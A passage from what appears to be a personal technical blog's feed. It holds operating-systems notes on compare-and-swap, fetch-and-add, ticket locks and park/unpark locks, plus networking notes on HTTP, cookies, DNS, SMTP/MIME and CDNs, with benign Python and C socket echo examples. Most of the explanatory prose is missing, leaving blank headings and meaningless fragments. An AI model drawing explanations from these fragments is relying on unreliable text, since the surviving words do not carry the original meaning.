(rs1)</span><br><span class="line"> rs1  rd  rs1 (reservation set),w/d  32 /64 ,</span><br><span class="line">sc.&#123;w/d&#125;.&#123;aqrl&#125; rd, rs2, (rs1)</span><br><span class="line">scrs2rs1 rs1  rs2  rs1  rd  0 rs1  rd  1 schart</span><br></pre></td></tr></table></figure><p><strong>xchgCompare-and-Swap  LR&#x2F;SC </strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cas</span><span class="params">(<span class="type">int</span> *addr, <span class="type">int</span> cmp_val, <span class="type">int</span> new_val)</span> &#123;</span><br><span class="line">  <span class="type">int</span> old_val = *addr;</span><br><span class="line">  <span class="keyword">if</span> (old_val == cmp_val) &#123;</span><br><span class="line">    *addr = new_val; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas:</span><br><span class="line">  lr.w  t0, (a0)       # Load original value.</span><br><span class="line">  bne   t0, a1, fail   # Doesnt match, so fail.</span><br><span class="line">  sc.w  t0, a2, (a0)   # Try to update.</span><br><span class="line">  bnez  t0, cas        # Retry if store-conditional failed.</span><br><span class="line">  li a0, 0             # Set return to success.</span><br><span class="line">  jr ra                # Return.</span><br><span class="line">fail:</span><br><span class="line">  li a0, 1             # Set return to failure.</span><br><span class="line">  jr ra                # Return</span><br></pre></td></tr></table></figure><p><strong></strong></p><ul><li><p> </p></li><li><p> </p></li><li><p></p><ul><li></li><li></li></ul></li></ul><h3 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h3><p>fetch-and-add</p><p><strong>x86</strong></p><p>xadd dest,srcExchange and Add</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">destsrcdest</span><br><span class="line">TEMP := SRC + DEST;</span><br><span class="line">SRC := DEST;</span><br><span class="line">DEST := TEMP;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">fetch_and_add</span><span class="params">(<span class="type">int</span>* variable, <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lock; xaddl %0, %1&quot;</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;+r&quot;</span> (value), <span class="string">&quot;+m&quot;</span> (*variable) <span class="comment">// input+output</span></span></span><br><span class="line"><span class="params">                     : <span class="comment">// No input-only</span></span></span><br><span class="line"><span class="params">                     : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">                    )</span>;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ticket</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FetchAndAdd</span><span class="params">(<span class="type">int</span> *ptr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> old = *ptr;</span><br><span class="line">    *ptr = old + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> old;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> ticket;</span><br><span class="line">    <span class="type">int</span> turn;</span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    lock-&gt;ticket = <span class="number">0</span>;</span><br><span class="line">    lock-&gt;turn = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    <span class="type">int</span> myturn = FetchAndAdd(&amp;lock-&gt;ticket);</span><br><span class="line">    <span class="keyword">while</span> (lock-&gt;turn != myturn)</span><br><span class="line">        ; <span class="comment">// spin</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *lock)</span> &#123;</span><br><span class="line">    FetchAndAdd(&amp;lock-&gt;turn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ticket</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>yield+yield()cpu</p><h3 id="park-"><a href="#park-" class="headerlink" title="park+"></a>park+</h3><p><strong>Solaris</strong></p><p>Solarispark()unpark(threadID) threadID </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">lock_t</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> flag;</span><br><span class="line">  <span class="type">int</span> guard;</span><br><span class="line">  <span class="type">queue_t</span> *q;<span class="comment">//</span></span><br><span class="line">&#125; <span class="type">lock_t</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_init</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  m-&gt;flag = <span class="number">0</span>;</span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">  queue_init(m-&gt;q);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired </span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (queue_empty(m-&gt;q))</span><br><span class="line">    m-&gt;flag = <span class="number">0</span>; <span class="comment">// let go of lock; no one wants it</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    unpark(queue_remove(m-&gt;q)); <span class="comment">// hold lock (for next thread!)flag</span></span><br><span class="line">  m-&gt;guard = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>:park,park</p><p>Solaris separk()</p><p>setpark(): park unparkpark,</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="type">lock_t</span> *m)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (TestAndSet(&amp;m-&gt;guard, <span class="number">1</span>) == <span class="number">1</span>)<span class="comment">//</span></span><br><span class="line">    ; <span class="comment">// acquire guard lock by spinning</span></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">    m-&gt;flag = <span class="number">1</span>; <span class="comment">// lock is acquired </span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    queue_add(m-&gt;q, gettid());</span><br><span class="line">    setpark();<span class="comment">// new code</span></span><br><span class="line">    m-&gt;guard = <span class="number">0</span>;<span class="comment">//</span></span><br><span class="line">    park();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Heap</title>
      <link href="/2023/09/01/kernel-heap/"/>
      <url>/2023/09/01/kernel-heap/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>:&amp;&amp;</title>
      <link href="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827150702534.png" alt="image-20230827150702534"></p><p></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>- (C&#x2F;S:client&#x2F;server)<ul><li></li><li></li><li></li></ul></li><li> (P2P:Peer To Peer)<ul><li></li><li></li><li></li></ul></li><li> -</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>(socket)0</p><p></p><ul><li>:IP</li><li>:TCP or UDP</li><li>:</li></ul><p></p><ul><li></li><li></li><li></li><li></li></ul><p>UDPTCP</p><ul><li>TCPTransmission Control Protocol<ul><li></li><li></li><li></li></ul></li><li>UDPUser Datagram Protocol<ul><li></li><li></li><li></li></ul></li></ul><blockquote><p>TCP(secure sockets layer,SSL)SSL<strong></strong></p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>http (hypertext transfer protocol) tcp() 80</p><p>http&#x2F;1.0http&#x2F;1.1</p><blockquote><p>,tcp</p><p></p><p> ---</p></blockquote><p>URL: </p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">protocol://user:password@www.someSchool.edu/someDept/pic.gif:port</span><br><span class="line">                              </span><br></pre></td></tr></table></figure><p><strong>HTTP</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827121842745.png" alt="image-20230827121842745"></p><blockquote><p>post</p></blockquote><p><strong>HTTP</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230827122100051.png" alt="image-20230827122100051"></p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>httpcookie</p><p>cookie</p><ul><li>cookie</li><li>cookie</li><li>web</li></ul><p>webweb<code>Set-cookie</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-cookie</span><span class="punctuation">: </span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>cookiecookiewebcookie</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>xxxxxxxxxxx</span><br></pre></td></tr></table></figure><h3 id="web-"><a href="#web-" class="headerlink" title="web()"></a>web()</h3><p>httpwebwebhttpwebwebtcp</p><blockquote><p></p></blockquote><h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>web:get</p><p>get<code>If-Modified-Since</code>get</p><p><strong></strong></p><p>web</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p></p><p>get</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Get /path/xxx.jpg HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.grxer.com</span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Wed, 9 Sep 2023 06:23:45</span><br></pre></td></tr></table></figure><p>get200ok 304 Not Modified,web</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">304</span> Not Modified</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="language-clojure">(<span class="name"><span class="built_in">empty</span></span> entity body)</span></span><br></pre></td></tr></table></figure><h2 id="E-Mail"><a href="#E-Mail" class="headerlink" title="E-Mail"></a>E-Mail</h2><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230828230533757.png" alt="image-20230828230533757"></p><p></p><ul><li> user agent</li><li> mail server </li><li>SMTP simple mail transfer protocol</li></ul><h3 id="SMTP-"><a href="#SMTP-" class="headerlink" title="SMTP()"></a>SMTP()</h3><p>TCP 25</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829110643721.png" alt="image-20230829110643721"></p><p>TCPSMTP</p><p>7ascii</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">From:hello@xxx.com</span><br><span class="line">To:world@xxx.com</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a><a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E7%94%A8%E9%80%94%E4%BA%92%E8%81%AF%E7%B6%B2%E9%83%B5%E4%BB%B6%E6%93%B4%E5%B1%95">MIME</a></h4><p>asciiMIME (Multipurpose Internet Mail Extensions)</p><p>MIME</p><p>MIME</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MIME-Version</span><span class="punctuation">: </span>1.0</span><br></pre></td></tr></table></figure><p></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>[type]/[subtype]; parameter</span><br></pre></td></tr></table></figure><p></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Transfer-Encoding</span><span class="punctuation">: </span>[mechanism]</span><br></pre></td></tr></table></figure><p>mechanism7bit8bitbinaryquoted-printablebase64</p><h3 id="-"><a href="#-" class="headerlink" title="()"></a>()</h3><p>POP3 Post Office ProtocolVersion 3,</p><p>IMAP Internet Mail Access Protocol </p><p>HTTP</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p><strong>Domain Name System</strong> ip</p><p>DNSUDP53</p><p>DNS</p><ul><li>DNS</li><li>(Top-Level Domain,TLD)DNS</li><li>DNS</li></ul><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230829180249922.png" alt="image-20230829180249922"></p><p>DNS<strong></strong><strong></strong>DNSDNSDNSDNS</p><blockquote><p><strong></strong>DNSDNSDNS </p><p><strong></strong>DNSDNSDNSDNS </p></blockquote><p> <a href="http://www.ytu.edu.cn/">www.ytu.edu.cn</a></p><ul><li><p>query <a href="http://www.ytu.edu.cn" dns(),dns, ">www.ytu.edu.cn&quot;DNS()DNS</a></p></li><li><p></p><p>1.DNSquery <a href="http://www.ytu.edu.cn" , ">www.ytu.edu.cn&quot;</a> <code>.cn</code> </p><p>2.DNS <code>.cn</code> query <a href="http://www.ytu.edu.cn" , ">www.ytu.edu.cn&quot;</a> <code>.edu.cn</code> </p><p>3.DNS <code>.edu.cn</code> query <a href="http://www.ytu.edu.cn" , ">www.ytu.edu.cn&quot;</a> www A</p></li></ul><p>DNS(Resource Record,RR),</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830170605836.png" alt="image-20230830170605836"></p><p><strong>DNS</strong></p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230830181152543.png" alt="image-20230830181152543"></p><p>wiresharkdns</p><p><img src="/2023/08/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E5%BA%94%E7%94%A8%E5%B1%82/image-20230902212408489.png" alt="image-20230902212408489"></p><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2><p>p2p BitTorrent </p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>ISPhttpDASH(Dynmic Adaptive Streaming over Http)HTTP</p><h3 id="DASH"><a href="#DASH" class="headerlink" title="DASH"></a>DASH</h3><p>:</p><ul><li></li><li>8-10</li><li>manifest file: URL</li></ul><p>:</p><ul><li></li><li></li><li>,HTTP<ul><li></li><li> ()</li></ul></li></ul><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>Content Distribution Networks </p><p>cdn</p><p>cdn</p><ol><li><p>manifest filecdn</p></li><li><p>cdndns()</p></li></ol><p>dns</p><ol><li> DNS LDNS DNS  DNS <em></em>DNS IP  LDNS  CDN </li><li>LDNSCDNDNSCDNDNSCDNIPLDNS</li><li>LDNSCDN</li><li>CDNTCPhttp getdash</li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="UDPpython"><a href="#UDPpython" class="headerlink" title="UDPpython"></a>UDPpython</h3><p>UDPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> Socket</span></span><br><span class="line"><span class="string">: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">: SOCK_DGRAM ( UDP )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"><span class="comment">#host,port,port</span></span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))<span class="comment">#host=&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#recvfromUDP,,data,address</span></span><br><span class="line">    <span class="comment">#addressip(ipaddrport</span></span><br><span class="line">    message,clientAddr=serverSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line">    modifiedMessage=message.decode().upper()</span><br><span class="line">    <span class="comment">#sendtoUDP,addressipaddrport</span></span><br><span class="line">    serverSocket.sendto(modifiedMessage.encode(),clientAddr)</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="comment">#socket</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.sendto(message.encode(),(serverName,serverPort))</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="TCPpython"><a href="#TCPpython" class="headerlink" title="TCPpython"></a>TCPpython</h3><p>TCPServer</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> Socket</span></span><br><span class="line"><span class="string">address family: AF_INET (IPv4)</span></span><br><span class="line"><span class="string">: SOCK_STREAM ( TCP )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">serverSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line">serverSocket.bind((<span class="string">&#x27;&#x27;</span>,serverPort))</span><br><span class="line"><span class="comment">#TCP,backlog</span></span><br><span class="line">serverSocket.listen(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="comment">#tcp,TCP,</span></span><br><span class="line">  connectionSocket,addr=serverSocket.accept()</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="comment">#TCP</span></span><br><span class="line">  message=connectionSocket.recv(<span class="number">1024</span>)</span><br><span class="line">  modifiedMessage=message.decode().upper()</span><br><span class="line">  <span class="comment"># TCP tcpipport</span></span><br><span class="line">  connectionSocket.send(modifiedMessage.encode())</span><br><span class="line">  connectionSocket.close()</span><br></pre></td></tr></table></figure><p>TCPClient</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line">serverName=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">serverPort=<span class="number">1234</span></span><br><span class="line">clientSocket=socket(AF_INET,SOCK_STREAM)</span><br><span class="line"><span class="comment">#tcp</span></span><br><span class="line">clientSocket.connect((serverName,serverPort))</span><br><span class="line">message=<span class="built_in">input</span>(<span class="string">&#x27;string--&gt;STRING: &#x27;</span>)</span><br><span class="line">clientSocket.send(message.encode())</span><br><span class="line">modifiedMessage,serverAddr=clientSocket.recvfrom(<span class="number">2048</span>)</span><br><span class="line"><span class="built_in">print</span>(modifiedMessage.decode())</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="UDPlinux-C"><a href="#UDPlinux-C" class="headerlink" title="UDPlinux C"></a>UDPlinux C</h3><p>UDPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXQUEUE 5</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stringLow2Upper</span><span class="params">(<span class="type">char</span> *<span class="built_in">string</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(<span class="built_in">string</span>); i++) &#123;</span><br><span class="line">       <span class="built_in">string</span>[i] =<span class="built_in">toupper</span>(<span class="built_in">string</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span>;</span></span><br><span class="line">    serverSockaddr.sin_family = AF_INET;</span><br><span class="line">    serverSockaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">    serverSockaddr.sin_port = htons(PORT);</span><br><span class="line">    <span class="comment">//udp socket</span></span><br><span class="line">    <span class="type">int</span> serverSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//socket</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">-1</span> == bind(serverSocket, (<span class="keyword">struct</span> sockaddr *)&amp;serverSockaddr,</span><br><span class="line">                   <span class="keyword">sizeof</span>(serverSockaddr))) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">       <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">       <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientSockaddr</span>;</span></span><br><span class="line">       <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(clientSockaddr);</span><br><span class="line">       <span class="comment">// ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,</span></span><br><span class="line">       <span class="comment">//                 struct sockaddr *src_addr, socklen_t *addrlen);</span></span><br><span class="line">       <span class="comment">//,ip:portclientSockaddr</span></span><br><span class="line">       recvfrom(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">                (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, &amp;length);</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;connect%s:%d\n&quot;</span>, inet_ntoa(clientSockaddr.sin_addr),</span><br><span class="line">              ntohs(clientSockaddr.sin_port));</span><br><span class="line">      <span class="comment">//  ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,</span></span><br><span class="line">      <span class="comment">//                 const struct sockaddr *dest_addr, socklen_t addrlen);</span></span><br><span class="line">      stringLow2Upper(buffer);</span><br><span class="line">      sendto(serverSocket, buffer, BUFFER_SIZE, <span class="number">0</span>, (<span class="keyword">struct</span> sockaddr *)&amp;clientSockaddr, length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UDPClient</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 1234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 2048</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverSockaddr</span> =</span> &#123;</span><br><span class="line">        .sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>),</span><br><span class="line">        .sin_port = htons(PORT),</span><br><span class="line">        .sin_family = AF_INET,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//socket</span></span><br><span class="line">    <span class="type">int</span> clientSocket = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> sendBuffer[BUFFER_SIZE], recvBuffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">socklen_t</span> length = <span class="keyword">sizeof</span>(serverSockaddr);</span><br><span class="line">    <span class="built_in">memset</span>(sendBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(recvBuffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    fgets(sendBuffer, BUFFER_SIZE, <span class="built_in">stdin</span>);</span><br><span class="line">    sendto(clientSocket, sendBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">           (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, length);</span><br><span class="line">    recvfrom(clientSocket, recvBuffer, BUFFER_SIZE, <span class="number">0</span>,</span><br><span class="line">             (<span class="keyword">struct</span> sockaddr*)&amp;serverSockaddr, &amp;length);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,recvBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TCPlinux-C"><a href="#TCPlinux-C" class="headerlink" title="TCPlinux C"></a>TCPlinux C</h3><p>TCPServer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 